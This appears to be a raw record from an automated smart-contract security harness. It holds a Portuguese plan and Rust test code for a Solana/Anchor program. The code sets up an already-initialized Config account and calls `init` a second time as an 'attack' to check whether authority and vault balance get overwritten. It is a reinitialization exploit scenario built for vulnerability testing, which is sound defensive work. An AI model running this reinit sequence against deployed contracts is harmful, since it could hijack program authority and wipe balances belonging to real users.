attempts.raw:
{
  "plan": "O programa-alvo é a instrução `init`, que grava `authority`, `is_initialized = true` e `vault_balance = 0` em uma conta `Config`. O baseline chama `init` legitimamente sobre uma conta `Config` já existente (criada com dados iniciais diferentes), provando que o cenário está montado. O ataque repete a mesma chamada sobre a conta já inicializada, tentando sobrescrever o estado. O efeito medido é que `is_initialized` continua verdadeiro e `vault_balance` foi sobrescrito para 0, ou que a autoridade foi alterada, demonstrando reinicialização.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta Config já existente, com estado inicial diferente do que init gravaria.
let config_data = anchor_account_data(
    "Config",
    &(attacker, true, 12345u64),
);
let config_key = Pubkey::new_unique();
let config_account = account(&env.program_id, &config_data, None);

let contas = vec![
    (config_key, config_account.clone()),
    (authority, wallet(1_000_000_000)),
];

let ix = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

// Uso legítimo: init sobre a conta já existente (o programa não tem constraint de init).
let baseline = env.baseline("init legitimo", &ix, &contas);

// Ataque: repetir init sobre a mesma conta já inicializada.
let ataque = env.attack("reinit", &ix, &contas);

if ataque.program_result == ProgramResult::Success {
    let depois = after(&ataque, &config_key);
    let dados = depois.data();
    let authority_depois = read_pubkey(dados, 8);
    let is_init_depois = dados[40] != 0;
    let vault_depois = read_u64(dados, 41);

    env.effect(
        "estado sobrescrito por reinit",
        authority_depois == authority && is_init_depois && vault_depois == 0,
    );
}"
}

